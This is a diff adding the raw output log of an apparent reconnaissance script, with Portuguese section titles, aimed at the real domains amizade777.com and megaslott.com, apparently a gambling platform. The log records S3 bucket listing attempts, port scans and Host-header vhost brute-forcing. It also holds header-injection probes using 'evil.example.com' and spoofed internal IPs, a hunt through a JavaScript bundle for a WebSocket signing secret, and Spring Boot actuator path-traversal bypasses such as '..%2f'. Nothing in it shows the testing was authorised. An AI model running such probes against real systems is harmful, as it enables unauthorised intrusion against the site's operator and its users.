@@ -1,0 +1,296 @@
+﻿
+======================================================================
+  [1/8] S3 BUCKET LISTING DIRETO (sx.megaslott.com)
+======================================================================
+  [403] https://sx.megaslott.com/?list-type=2
+  [403] https://sx.megaslott.com/?list-type=2&prefix=
+  [403] https://sx.megaslott.com/?list-type=2&prefix=download/
+  [403] https://sx.megaslott.com/?list-type=2&max-keys=10
+  [403] https://sx.megaslott.com/?prefix=download
+  [403] https://sx.megaslott.com/?delimiter=/
+  [403] https://sx.megaslott.com/?delimiter=/&prefix=download/
+  [403] https://sx.megaslott.com/?marker=Amizade
+  [403] https://sx.megaslott.com/?versions
+  [403] https://sx.megaslott.com/?policy
+  [403] https://sx.megaslott.com/?acl
+  [403] https://sx.megaslott.com/?cors
+  [403] https://sx.megaslott.com/?lifecycle
+  [404] https://megaslott-prod.s3.amazonaws.com/?list-type=2
+  [404] https://megaslott.s3.amazonaws.com/?list-type=2
+  [403] https://sx-megaslott.s3.amazonaws.com/?list-type=2
+  [404] https://amizade777.s3.amazonaws.com/?list-type=2
+  [404] https://amizade-prod.s3.amazonaws.com/?list-type=2
+
+======================================================================
+  [2/8] PORTAS ABERTAS EM api/test/sx megaslott.com
+======================================================================
+
+  api.megaslott.com (54.207.65.155):
+
+  test.megaslott.com (52.67.28.188):
+
+  sx.megaslott.com (54.240.184.50):
+       80/tcp ABERTA
+      443/tcp ABERTA
+      http://sx.megaslott.com:80/: 403 server=AmazonS3 body=<?xml version="1.0" encoding="UTF-8"?> <Error><Code>AccessDenied</Code><Message>
+      https://sx.megaslott.com:443/: 403 server=AmazonS3 body=<?xml version="1.0" encoding="UTF-8"?> <Error><Code>AccessDenied</Code><Message>
+
+======================================================================
+  [3/8] VHOST DISCOVERY (Host header tricks)
+======================================================================
+  Manda GET https://ds.amizade777.com/ mas com Host: <candidato>
+  Diferenca de tamanho/status indica vhost roteando
+  baseline ds.amizade777.com: status=200 size=6166
+    Host: admin.amizade777.com                     -> 403 size=915 title=ERROR: The request could not be satisfied  <-- DIFERENTE
+    Host: manage.amizade777.com                    -> 403 size=915 title=ERROR: The request could not be satisfied  <-- DIFERENTE
+    Host: manager.amizade777.com                   -> 403 size=915 title=ERROR: The request could not be satisfied  <-- DIFERENTE
+    Host: console.amizade777.com                   -> 403 size=915 title=ERROR: The request could not be satisfied  <-- DIFERENTE
+    Host: panel.amizade777.com                     -> 403 size=915 title=ERROR: The request could not be satisfied  <-- DIFERENTE
+    Host: painel.amizade777.com                    -> 403 size=915 title=ERROR: The request could not be satisfied  <-- DIFERENTE
+    Host: adm.amizade777.com                       -> 403 size=915 title=ERROR: The request could not be satisfied  <-- DIFERENTE
+    Host: internal.amizade777.com                  -> 403 size=915 title=ERROR: The request could not be satisfied  <-- DIFERENTE
+    Host: intranet.amizade777.com                  -> 403 size=915 title=ERROR: The request could not be satisfied  <-- DIFERENTE
+    Host: staging.amizade777.com                   -> 403 size=915 title=ERROR: The request could not be satisfied  <-- DIFERENTE
+    Host: stage.amizade777.com                     -> 403 size=915 title=ERROR: The request could not be satisfied  <-- DIFERENTE
+    Host: homolog.amizade777.com                   -> 403 size=915 title=ERROR: The request could not be satisfied  <-- DIFERENTE
+    Host: dev.amizade777.com                       -> 403 size=915 title=ERROR: The request could not be satisfied  <-- DIFERENTE
+    Host: test.amizade777.com                      -> 403 size=915 title=ERROR: The request could not be satisfied  <-- DIFERENTE
+    Host: qa.amizade777.com                        -> 403 size=915 title=ERROR: The request could not be satisfied  <-- DIFERENTE
+    Host: uat.amizade777.com                       -> 403 size=915 title=ERROR: The request could not be satisfied  <-- DIFERENTE
+    Host: preview.amizade777.com                   -> 403 size=915 title=ERROR: The request could not be satisfied  <-- DIFERENTE
+    Host: api.amizade777.com                       -> 403 size=915 title=ERROR: The request could not be satisfied  <-- DIFERENTE
+    Host: api-internal.amizade777.com              -> 403 size=915 title=ERROR: The request could not be satisfied  <-- DIFERENTE
+    Host: operator.amizade777.com                  -> 403 size=915 title=ERROR: The request could not be satisfied  <-- DIFERENTE
+    Host: operador.amizade777.com                  -> 403 size=915 title=ERROR: The request could not be satisfied  <-- DIFERENTE
+    Host: agent.amizade777.com                     -> 403 size=915 title=ERROR: The request could not be satisfied  <-- DIFERENTE
+    Host: agente.amizade777.com                    -> 403 size=915 title=ERROR: The request could not be satisfied  <-- DIFERENTE
+    Host: agentes.amizade777.com                   -> 403 size=915 title=ERROR: The request could not be satisfied  <-- DIFERENTE
+    Host: afiliado.amizade777.com                  -> 403 size=915 title=ERROR: The request could not be satisfied  <-- DIFERENTE
+    Host: backoffice.amizade777.com                -> 403 size=915 title=ERROR: The request could not be satisfied  <-- DIFERENTE
+    Host: back.amizade777.com                      -> 403 size=915 title=ERROR: The request could not be satisfied  <-- DIFERENTE
+    Host: support.amizade777.com                   -> 403 size=915 title=ERROR: The request could not be satisfied  <-- DIFERENTE
+    Host: suporte.amizade777.com                   -> 403 size=915 title=ERROR: The request could not be satisfied  <-- DIFERENTE
+    Host: system.amizade777.com                    -> 403 size=915 title=ERROR: The request could not be satisfied  <-- DIFERENTE
+    Host: sys.amizade777.com                       -> 403 size=915 title=ERROR: The request could not be satisfied  <-- DIFERENTE
+    Host: monitor.amizade777.com                   -> 403 size=915 title=ERROR: The request could not be satisfied  <-- DIFERENTE
+    Host: metrics.amizade777.com                   -> 403 size=915 title=ERROR: The request could not be satisfied  <-- DIFERENTE
+    Host: grafana.amizade777.com                   -> 403 size=915 title=ERROR: The request could not be satisfied  <-- DIFERENTE
+    Host: kibana.amizade777.com                    -> 403 size=915 title=ERROR: The request could not be satisfied  <-- DIFERENTE
+    Host: prometheus.amizade777.com                -> 403 size=915 title=ERROR: The request could not be satisfied  <-- DIFERENTE
+    Host: actuator.amizade777.com                  -> 403 size=915 title=ERROR: The request could not be satisfied  <-- DIFERENTE
+    Host: admin.megaslott.com                      -> 403 size=915 title=ERROR: The request could not be satisfied  <-- DIFERENTE
+    Host: panel.megaslott.com                      -> 403 size=915 title=ERROR: The request could not be satisfied  <-- DIFERENTE
+    Host: manage.megaslott.com                     -> 403 size=915 title=ERROR: The request could not be satisfied  <-- DIFERENTE
+    Host: internal.megaslott.com                   -> 403 size=915 title=ERROR: The request could not be satisfied  <-- DIFERENTE
+    Host: operator.megaslott.com                   -> 403 size=915 title=ERROR: The request could not be satisfied  <-- DIFERENTE
+
+======================================================================
+  [4/8] CACHE POISONING / HEADER ABUSE
+======================================================================
+  GET / com cada header e ve se o response muda
+  baseline: status=200 size=6166
+    X-Forwarded-For:                 '127.0.0.1'                              -> 200 size=6166
+    X-Forwarded-For:                 '172.16.0.245'                           -> 200 size=6166
+    X-Forwarded-Host:                'evil.example.com'                       -> 200 size=6166
+    X-Forwarded-Host:                'internal.amizade777.com'                -> 200 size=6166
+    X-Forwarded-Proto:               'http'                                   -> 200 size=6166 REFLECTED
+    X-Original-URL:                  '/admin'                                 -> 200 size=6166
+    X-Rewrite-URL:                   '/admin'                                 -> 200 size=6166
+    X-Real-IP:                       '172.16.0.245'                           -> 200 size=6166
+    X-Originating-IP:                '127.0.0.1'                              -> 200 size=6166
+    X-Custom-IP-Authorization:       '127.0.0.1'                              -> 200 size=6166
+    X-Forwarded-Server:              'internal.amizade777.com'                -> 200 size=6166
+    X-Host:                          'evil.example.com'                       -> 200 size=6166
+    Referer:                         'http://internal.amizade777.com/'        -> 200 size=6166
+    X-Backend-Server:                '172.16.0.245:3001'                      -> 200 size=6166
+    X-Internal:                      '1'                                      -> 200 size=6166 REFLECTED
+    X-Debug:                         '1'                                      -> 200 size=6166 REFLECTED
+    Cluster-Client-IP:               '172.16.0.245'                           -> 200 size=6166
+    Forwarded:                       'for=127.0.0.1; host=evil.example.com'   -> 200 size=6166
+
+======================================================================
+  [5/8] DEEP DIVE EM message.js (procurar segredo do sign do WebSocket)
+======================================================================
+  arquivo: ds.amizade777.com_message.js (3699198 chars)
+
+  Chamadas a sign/md5/hmac: 13
+    prototype.sign
+    message.sign
+    message.sign
+    message.sign
+    message.sign
+    message.sign
+    object.sign
+    message.sign
+    object.sign
+    object.sign
+    message.sign
+    object.sign
+    message.sign
+
+  Constantes hex: 16-bytes=0 32-bytes=0 64-bytes=0
+
+  Protobuf field references: 33
+
+  Nomes de mensagens protobuf (heuristica): 268
+    ABBatchBetEvent
+    ABBetEvent
+    ABBetReq
+    ABGameEndEvent
+    ABGameStartEvent
+    ABTableStateEvent
+    AnswerEvent
+    AnswerReq
+    ButtonSeatEvent
+    BuyInRangeReq
+    BuyInReq
+    ChatExpressionEvent
+    ChatExpressionReq
+    ChatVoiceEvent
+    ChatVoiceReq
+    CrashPlayersEvent
+    DealCardsEvent
+    DeclareEvent
+    EnterRoomReq
+    ExitRoomReq
+    GameBalanceEvent
+    GameDataReq
+    GameEndEvent
+    GameStartEvent
+    GameStartReq
+    GameStartResp
+    GameTestReq
+    GameTestResp
+    GlobalNotice
+    GroupReq
+
+  URLs de WebSocket no JS: 0
+
+  Strings de secret/salt/key encontradas: 0
+
+======================================================================
+  [6/8] WEBSOCKET HANDSHAKE (low-level, sem login)
+======================================================================
+  resposta (385 bytes):
+    HTTP/1.1 101 Switching Protocols
+    Connection: upgrade
+    Server: nginx/1.24.0
+    Date: Mon, 08 Jun 2026 18:27:58 GMT
+    Upgrade: websocket
+    Sec-Websocket-Accept: SllSN/p5pTB8gMW5Pg5NBe3WXm8=
+    X-Cache: Miss from cloudfront
+    Via: 1.1 0633183bc8a7a616d500096f2c54e9fe.cloudfront.net (CloudFront)
+    X-Amz-Cf-Pop: FOR50-P6
+    X-Amz-Cf-Id: YSmo3nxm1pMH0LsGBmsOGueKLS_Ssuzx6OSM2i3dORLUbzV1q1A9IA==
+    
+    
+
+======================================================================
+  [7/8] SPRING BOOT ACTUATOR ÔÇö path traversal e bypass tricks
+======================================================================
+  [200]    44b  /japi/actuator/                                   
+  [200]    44b  /japi/actuator/info                               
+  [200]    44b  /japi/actuator/env                                
+  [200]    44b  /japi/actuator/beans                              
+  [200]    44b  /japi/actuator/heapdump                           
+  [200]    44b  /japi/actuator/configprops                        
+  [200]    44b  /japi/actuator/health                             
+  [200]    44b  /japi/actuator/mappings                           
+  [200]    44b  /japi/actuator/threaddump                         
+  [200]    44b  /japi/actuator/loggers                            
+  [200]    44b  /japi/actuator/metrics                            
+  [200]    44b  /japi/actuator/prometheus                         
+  [200]  6166b  /japi/..%2factuator/health                          <-- INTERESTING
+    body: <!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8" />
+  <link rel="icon" href="/favicon.ico" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Amizad
+  [200]    44b  /japi/..;/actuator/health                         
+  [200]    44b  /japi/.;/actuator/health                          
+  [400]   915b  /japi/..%2f..%2factuator/health                     <-- INTERESTING
+    body: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR
+  [200]  6166b  /actuator/health                                    <-- INTERESTING
+    body: <!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8" />
+  <link rel="icon" href="/favicon.ico" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Amizad
+  [200]  6166b  /actuator/env                                       <-- INTERESTING
+    body: <!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8" />
+  <link rel="icon" href="/favicon.ico" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Amizad
+  [404]  1552b  /api/actuator/health                              
+  [200]  6166b  /health                                             <-- INTERESTING
+    body: <!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8" />
+  <link rel="icon" href="/favicon.ico" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Amizad
+  [200]  6166b  /info                                               <-- INTERESTING
+    body: <!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8" />
+  <link rel="icon" href="/favicon.ico" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Amizad
+  [200]  6166b  /manager/html                                       <-- INTERESTING
+    body: <!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8" />
+  <link rel="icon" href="/favicon.ico" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Amizad
+  [200]  6166b  /host-manager/html                                  <-- INTERESTING
+    body: <!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8" />
+  <link rel="icon" href="/favicon.ico" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Amizad
+  [200]  6166b  /error                                              <-- INTERESTING
+    body: <!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8" />
+  <link rel="icon" href="/favicon.ico" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Amizad
+  [200]    44b  /japi/error                                       
+  [200]    44b  //japi/actuator/health                            
+  [200]    44b  /japi//actuator/health                            
+  [200]    44b  /japi/./actuator/health                           
+
+======================================================================
+  [8/8] CROSS-REFERENCE DNS (mais prefixos em ambos os apexes)
+======================================================================
+
+  testando amizade777.com:
+
+  testando megaslott.com:
+    [DNS] test.megaslott.com -> 52.67.28.188
+
+  Salvo em sessao_extra.json
